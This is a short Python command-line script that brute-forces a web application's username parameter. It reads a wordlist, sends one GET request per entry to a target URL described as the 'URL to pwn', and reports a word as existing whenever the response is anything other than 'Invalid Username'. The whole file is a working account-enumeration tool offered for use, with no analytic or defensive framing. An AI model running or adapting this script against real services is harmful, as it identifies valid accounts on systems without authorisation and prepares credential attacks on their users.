#!/usr/bin/env python3

import requests, argparse

parser = argparse.ArgumentParser()

parser.add_argument('-u', '--url', required=True, help='URL to pwn')
parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist')
parser.add_argument('-a', '--arg', required=True, help='Arguement in the request to brute force')

args = parser.parse_args()

def readWords(fname):
	words = []
	try:
		with open(fname, 'r') as ifile:
			lines = ifile.readlines()
			for line in lines:
				words.append(line[:-1])

			return words
	except:
		print('Error reading wordlist, quitting...')
		exit(1)


def brute(words=[]):
	s = requests.Session()
	for word in words:
		print(f'[+] Trying {word}')
		try:
			r = s.get(f'{args.url}?{args.arg}={word}')
			if r.text == 'Invalid Username':
				print(f'[-] {word} Failed, trying next...')
			else:
				print(f'[+] {word} Exists!')
				return
		except:
			print('[-] Error communicating with the server.')
			exit(1)


def main():
	print('[.] Reading words')
	words = readWords(args.wordlist)
	print('[+] Done')
	print('[+] Brute force starting')
	brute(words)
	print('[+] Done. exiting...')


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print('Goodbye!')
		exit(0)
